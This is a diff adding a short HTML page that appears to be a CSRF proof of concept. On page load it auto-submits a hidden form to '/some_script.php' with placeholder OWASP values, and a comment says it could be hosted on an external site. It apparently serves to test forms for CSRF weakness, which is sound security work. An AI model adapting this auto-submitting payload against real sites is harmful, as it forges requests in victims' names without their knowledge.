@@ -1,0 +1,12 @@
+<html>
+<body>
+    <!-- This could be hosted on an external site and use the absolute path to the post action, too. -->
+    <form action="/some_script.php" method="post" id="csrf">
+        <input name="name" type="hidden" value="Malicious Entry" />
+        <input name="email" type="hidden" value="malicious@owasp.org" />
+        <input name="website" type="hidden" value="http://www.owasp.org/" />
+        <input name="message" type="hidden" value="If you see this, your form is vulnerable to CSRF attacks!" />
+    </form>
+	<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
